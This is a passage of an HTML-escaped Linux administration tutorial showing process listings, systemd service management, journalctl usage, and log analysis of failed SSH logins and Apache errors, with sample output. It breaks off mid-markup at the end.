class=\"cl\"\u003eroot           \u003cspan class=\"m\"\u003e2\u003c/span\u003e  0.0  0.0      \u003cspan class=\"m\"\u003e0\u003c/span\u003e     \u003cspan class=\"m\"\u003e0\u003c/span\u003e ?        S    Jan25   0:00 \u003cspan class=\"o\"\u003e[\u003c/span\u003ekthreadd\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eroot           \u003cspan class=\"m\"\u003e3\u003c/span\u003e  0.0  0.0      \u003cspan class=\"m\"\u003e0\u003c/span\u003e     \u003cspan class=\"m\"\u003e0\u003c/span\u003e ?        I\u0026lt;   Jan25   0:00 \u003cspan class=\"o\"\u003e[\u003c/span\u003ercu_gp\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eroot           \u003cspan class=\"m\"\u003e4\u003c/span\u003e  0.0  0.0      \u003cspan class=\"m\"\u003e0\u003c/span\u003e     \u003cspan class=\"m\"\u003e0\u003c/span\u003e ?        I\u0026lt;   Jan25   0:00 \u003cspan class=\"o\"\u003e[\u003c/span\u003ercu_par_gp\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eroot           \u003cspan class=\"m\"\u003e6\u003c/span\u003e  0.0  0.0      \u003cspan class=\"m\"\u003e0\u003c/span\u003e     \u003cspan class=\"m\"\u003e0\u003c/span\u003e ?        I\u0026lt;   Jan25   0:00 \u003cspan class=\"o\"\u003e[\u003c/span\u003ekworker/0:0H-kblockd\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eroot           \u003cspan class=\"m\"\u003e8\u003c/span\u003e  0.0  0.0      \u003cspan class=\"m\"\u003e0\u003c/span\u003e     \u003cspan class=\"m\"\u003e0\u003c/span\u003e ?        I\u0026lt;   Jan25   0:00 \u003cspan class=\"o\"\u003e[\u003c/span\u003emm_percpu_wq\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eroot           \u003cspan class=\"m\"\u003e9\u003c/span\u003e  0.0  0.0      \u003cspan class=\"m\"\u003e0\u003c/span\u003e     \u003cspan class=\"m\"\u003e0\u003c/span\u003e ?        S    Jan25   0:00 \u003cspan class=\"o\"\u003e[\u003c/span\u003eksoftirqd/0\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eroot          \u003cspan class=\"m\"\u003e10\u003c/span\u003e  0.0  0.0      \u003cspan class=\"m\"\u003e0\u003c/span\u003e     \u003cspan class=\"m\"\u003e0\u003c/span\u003e ?        I\u0026lt;   Jan25   0:00 \u003cspan class=\"o\"\u003e[\u003c/span\u003ercu_sched\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eroot          \u003cspan class=\"m\"\u003e11\u003c/span\u003e  0.0  0.0      \u003cspan class=\"m\"\u003e0\u003c/span\u003e     \u003cspan class=\"m\"\u003e0\u003c/span\u003e ?        I\u0026lt;   Jan25   0:00 \u003cspan class=\"o\"\u003e[\u003c/span\u003ercu_bh\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eroot          \u003cspan class=\"m\"\u003e12\u003c/span\u003e  0.0  0.0      \u003cspan class=\"m\"\u003e0\u003c/span\u003e     \u003cspan class=\"m\"\u003e0\u003c/span\u003e ?        S    Jan25   0:00 \u003cspan class=\"o\"\u003e[\u003c/span\u003emigration/0\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Process tree\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ pstree\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esystemd‚îÄ‚î¨‚îÄModemManager‚îÄ‚îÄ‚îÄ2*\u003cspan class=\"o\"\u003e[{\u003c/span\u003eModemManager\u003cspan class=\"o\"\u003e}]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        ‚îú‚îÄNetworkManager‚îÄ‚îÄ‚îÄ2*\u003cspan class=\"o\"\u003e[{\u003c/span\u003eNetworkManager\u003cspan class=\"o\"\u003e}]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        ‚îú‚îÄaccounts-daemon‚îÄ‚îÄ‚îÄ2*\u003cspan class=\"o\"\u003e[{\u003c/span\u003eaccounts-daemon\u003cspan class=\"o\"\u003e}]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        ‚îú‚îÄacpid\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        ‚îú‚îÄavahi-daemon‚îÄ‚îÄ‚îÄavahi-daemon\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        ‚îú‚îÄbluetoothd\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        ‚îú‚îÄcolord‚îÄ‚îÄ‚îÄ2*\u003cspan class=\"o\"\u003e[{\u003c/span\u003ecolord\u003cspan class=\"o\"\u003e}]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        ‚îú‚îÄcron\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        ‚îú‚îÄdbus-daemon\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        ‚îú‚îÄgdm3‚îÄ‚îÄ‚îÄgdm-session-wor‚îÄ‚îÄ‚îÄgdm-wayland-ses‚îÄ‚îÄ‚îÄgnome-session-b‚îÄ‚îÄ‚îÄ\u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e          gnome-session-c‚îÄ‚îÄ‚îÄgnome-shell‚îÄ‚îÄ‚îÄ3*\u003cspan class=\"o\"\u003e[{\u003c/span\u003egnome-shell\u003cspan class=\"o\"\u003e}]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        ‚îú‚îÄirqbalance\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        ‚îú‚îÄkerneloops\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        ‚îú‚îÄpackagekitd‚îÄ‚îÄ‚îÄ2*\u003cspan class=\"o\"\u003e[{\u003c/span\u003epackagekitd\u003cspan class=\"o\"\u003e}]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        ‚îú‚îÄpolkitd‚îÄ‚îÄ‚îÄ2*\u003cspan class=\"o\"\u003e[{\u003c/span\u003epolkitd\u003cspan class=\"o\"\u003e}]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        ‚îú‚îÄrsyslogd‚îÄ‚îÄ‚îÄ3*\u003cspan class=\"o\"\u003e[{\u003c/span\u003ersyslogd\u003cspan class=\"o\"\u003e}]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        ‚îú‚îÄsnapd‚îÄ‚îÄ‚îÄ8*\u003cspan class=\"o\"\u003e[{\u003c/span\u003esnapd\u003cspan class=\"o\"\u003e}]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        ‚îú‚îÄsystemd‚îÄ‚î¨‚îÄ\u003cspan class=\"o\"\u003e(\u003c/span\u003esd-pam\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        ‚îÇ         ‚îî‚îÄuser@1000.service‚îÄ‚î¨‚îÄdbus-daemon\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        ‚îÇ                           ‚îú‚îÄgnome-keyring-d‚îÄ‚îÄ‚îÄ3*\u003cspan class=\"o\"\u003e[{\u003c/span\u003egnome-keyring-d\u003cspan class=\"o\"\u003e}]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        ‚îÇ                           ‚îú‚îÄpulseaudio‚îÄ‚îÄ‚îÄ2*\u003cspan class=\"o\"\u003e[{\u003c/span\u003epulseaudio\u003cspan class=\"o\"\u003e}]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        ‚îÇ                           ‚îî‚îÄtracker-miner-f‚îÄ‚îÄ‚îÄ2*\u003cspan class=\"o\"\u003e[{\u003c/span\u003etracker-miner-f\u003cspan class=\"o\"\u003e}]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        ‚îú‚îÄsystemd-journal\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        ‚îú‚îÄsystemd-logind\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        ‚îú‚îÄsystemd-resolve\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        ‚îú‚îÄsystemd-timesyn‚îÄ‚îÄ‚îÄ\u003cspan class=\"o\"\u003e{\u003c/span\u003esystemd-timesyn\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        ‚îú‚îÄsystemd-udevd\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        ‚îú‚îÄthermald‚îÄ‚îÄ‚îÄ4*\u003cspan class=\"o\"\u003e[{\u003c/span\u003ethermald\u003cspan class=\"o\"\u003e}]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        ‚îú‚îÄudisksd‚îÄ‚îÄ‚îÄ4*\u003cspan class=\"o\"\u003e[{\u003c/span\u003eudisksd\u003cspan class=\"o\"\u003e}]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        ‚îú‚îÄunattended-upgr‚îÄ‚îÄ‚îÄ\u003cspan class=\"o\"\u003e{\u003c/span\u003eunattended-upgr\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        ‚îú‚îÄupowerd‚îÄ‚îÄ‚îÄ2*\u003cspan class=\"o\"\u003e[{\u003c/span\u003eupowerd\u003cspan class=\"o\"\u003e}]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        ‚îú‚îÄwhoopsie‚îÄ‚îÄ‚îÄ2*\u003cspan class=\"o\"\u003e[{\u003c/span\u003ewhoopsie\u003cspan class=\"o\"\u003e}]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        ‚îî‚îÄwpa_supplicant\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"service-management\"\u003eService Management\u003c/h2\u003e\n\u003ch3 id=\"systemd-services\"\u003eSystemd Services\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Service status\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ systemctl status apache2\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e‚óè apache2.service - The Apache HTTP Server\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e     Loaded: loaded \u003cspan class=\"o\"\u003e(\u003c/span\u003e/lib/systemd/system/apache2.service\u003cspan class=\"p\"\u003e;\u003c/span\u003e enabled\u003cspan class=\"p\"\u003e;\u003c/span\u003e vendor preset: enabled\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e     Active: active \u003cspan class=\"o\"\u003e(\u003c/span\u003erunning\u003cspan class=\"o\"\u003e)\u003c/span\u003e since Mon 2024-01-30 10:00:00 UTC\u003cspan class=\"p\"\u003e;\u003c/span\u003e 2h 15min ago\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e       Docs: https://httpd.apache.org/docs/2.4/\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e   Main PID: \u003cspan class=\"m\"\u003e1234\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003eapache2\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      Tasks: \u003cspan class=\"m\"\u003e55\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003elimit: 4915\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e     Memory: 12.5M\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e     CGroup: /system.slice/apache2.service\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e             ‚îú‚îÄ1234 /usr/sbin/apache2 -k start\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e             ‚îú‚îÄ1235 /usr/sbin/apache2 -k start\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e             ‚îî‚îÄ1236 /usr/sbin/apache2 -k start\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eJan \u003cspan class=\"m\"\u003e30\u003c/span\u003e 10:00:00 server01 systemd\u003cspan class=\"o\"\u003e[\u003c/span\u003e1\u003cspan class=\"o\"\u003e]\u003c/span\u003e: Starting The Apache HTTP Server...\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eJan \u003cspan class=\"m\"\u003e30\u003c/span\u003e 10:00:00 server01 apache2\u003cspan class=\"o\"\u003e[\u003c/span\u003e1234\u003cspan class=\"o\"\u003e]\u003c/span\u003e: AH00558: apache2: Could not reliably \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e  determine the server\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003es fully qualified domain name\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eJan \u003cspan class=\"m\"\u003e30\u003c/span\u003e 10:00:00 server01 systemd\u003cspan class=\"o\"\u003e[\u003c/span\u003e1\u003cspan class=\"o\"\u003e]\u003c/span\u003e: Started The Apache HTTP Server.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Start/stop services\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ sudo systemctl start apache2\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ sudo systemctl stop apache2\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ sudo systemctl restart apache2\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ sudo systemctl reload apache2\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Enable/disable services\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ sudo systemctl \u003cspan class=\"nb\"\u003eenable\u003c/span\u003e apache2\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ sudo systemctl disable apache2\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"log-management\"\u003eLog Management\u003c/h2\u003e\n\u003ch3 id=\"system-logs\"\u003eSystem Logs\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# System log\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ journalctl -u apache2\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e-- Logs begin at Mon 2024-01-30 10:00:00 UTC, end at Mon 2024-01-30 12:15:00 UTC. --\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eJan \u003cspan class=\"m\"\u003e30\u003c/span\u003e 10:00:00 server01 systemd\u003cspan class=\"o\"\u003e[\u003c/span\u003e1\u003cspan class=\"o\"\u003e]\u003c/span\u003e: Starting The Apache HTTP Server...\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eJan \u003cspan class=\"m\"\u003e30\u003c/span\u003e 10:00:00 server01 apache2\u003cspan class=\"o\"\u003e[\u003c/span\u003e1234\u003cspan class=\"o\"\u003e]\u003c/span\u003e: AH00558: apache2: Could not reliably \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e  determine the server\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003es fully qualified domain name\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eJan \u003cspan class=\"m\"\u003e30\u003c/span\u003e 10:00:00 server01 systemd\u003cspan class=\"o\"\u003e[\u003c/span\u003e1\u003cspan class=\"o\"\u003e]\u003c/span\u003e: Started The Apache HTTP Server.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Real-time log monitoring\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ journalctl -u apache2 -f\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e-- Logs begin at Mon 2024-01-30 10:00:00 UTC. --\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eJan \u003cspan class=\"m\"\u003e30\u003c/span\u003e 12:15:00 server01 apache2\u003cspan class=\"o\"\u003e[\u003c/span\u003e1234\u003cspan class=\"o\"\u003e]\u003c/span\u003e: \u003cspan class=\"o\"\u003e[\u003c/span\u003eclient 192.168.1.100:45678\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;GET / HTTP/1.1\u0026#34;\u003c/span\u003e \u003cspan class=\"m\"\u003e200\u003c/span\u003e \u003cspan class=\"m\"\u003e1234\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;-\u0026#34;\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eJan \u003cspan class=\"m\"\u003e30\u003c/span\u003e 12:15:01 server01 apache2\u003cspan class=\"o\"\u003e[\u003c/span\u003e1234\u003cspan class=\"o\"\u003e]\u003c/span\u003e: \u003cspan class=\"o\"\u003e[\u003c/span\u003eclient 192.168.1.101:45679\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;GET /favicon.ico HTTP/1.1\u0026#34;\u003c/span\u003e \u003cspan class=\"m\"\u003e404\u003c/span\u003e \u003cspan class=\"m\"\u003e1234\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;-\u0026#34;\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"advanced-log-analysis\"\u003eAdvanced Log Analysis\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Analyze failed login attempts\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ journalctl \u003cspan class=\"nv\"\u003e_SYSTEMD_UNIT\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003essh.service \u003cspan class=\"p\"\u003e|\u003c/span\u003e grep \u003cspan class=\"s2\"\u003e\u0026#34;Failed password\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eJan \u003cspan class=\"m\"\u003e30\u003c/span\u003e 12:30:00 server01 sshd\u003cspan class=\"o\"\u003e[\u003c/span\u003e5678\u003cspan class=\"o\"\u003e]\u003c/span\u003e: Failed password \u003cspan class=\"k\"\u003efor\u003c/span\u003e invalid user admin from 192.168.1.200 port \u003cspan class=\"m\"\u003e45123\u003c/span\u003e ssh2\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eJan \u003cspan class=\"m\"\u003e30\u003c/span\u003e 12:30:05 server01 sshd\u003cspan class=\"o\"\u003e[\u003c/span\u003e5679\u003cspan class=\"o\"\u003e]\u003c/span\u003e: Failed password \u003cspan class=\"k\"\u003efor\u003c/span\u003e root from 192.168.1.200 port \u003cspan class=\"m\"\u003e45124\u003c/span\u003e ssh2\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Find most frequent error patterns\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ journalctl --since \u003cspan class=\"s2\"\u003e\u0026#34;1 hour ago\u0026#34;\u003c/span\u003e -p err \u003cspan class=\"p\"\u003e|\u003c/span\u003e awk \u003cspan class=\"s1\"\u003e\u0026#39;{print $5}\u0026#39;\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e sort \u003cspan class=\"p\"\u003e|\u003c/span\u003e uniq -c \u003cspan class=\"p\"\u003e|\u003c/span\u003e sort -rn\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e     \u003cspan class=\"m\"\u003e15\u003c/span\u003e apache2\u003cspan class=\"o\"\u003e[\u003c/span\u003e1234\u003cspan class=\"o\"\u003e]\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"m\"\u003e8\u003c/span\u003e systemd\u003cspan class=\"o\"\u003e[\u003c/span\u003e1\u003cspan class=\"o\"\u003e]\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"m\"\u003e3\u003c/span\u003e kernel:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Monitor authentication logs\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ tail -f /var/log/auth.log \u003cspan class=\"p\"\u003e|\u003c/span\u003e grep --line-buffered -E \u003cspan class=\"s2\"\u003e\u0026#34;(Failed|Accepted)\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eJan \u003cspan class=\"m\"\u003e30\u003c/span\u003e 12:45:00 server01 sshd\u003cspan class=\"o\"\u003e[\u003c/span\u003e6789\u003cspan class=\"o\"\u003e]\u003c/span\u003e: Accepted publickey \u003cspan class=\"k\"\u003efor\u003c/span\u003e user1 from 192.168.1.150 port \u003cspan class=\"m\"\u003e52341\u003c/span\u003e ssh2\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eJan \u003cspan class=\"m\"\u003e30\u003c/span\u003e 12:45:30 server01 sshd\u003cspan class=\"o\"\u003e[\u003c/span\u003e6790\u003cspan class=\"o\"\u003e]\u003c/span\u003e: Failed password \u003cspan class=\"k\"\u003efor\u003c/span\u003e invalid user \u003cspan class=\"nb\"\u003etest\u003c/span\u003e from 192.168.1.200 port \u003cspan class=\"m\"\u003e52342\u003c/span\u003e ssh2\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Parse Apache access logs for suspicious activity\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ awk \u003cspan class=\"s1\"\u003e\u0026#39;$9 ~ /^4/ || $9 ~ /^5/ {print $0}\u0026#39;\u003c/span\u003e /var/log/apache2/access.log \u003cspan class=\"p\"\u003e|\u003c/span\u003e tail -10\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e192.168.1.200 - - \u003cspan 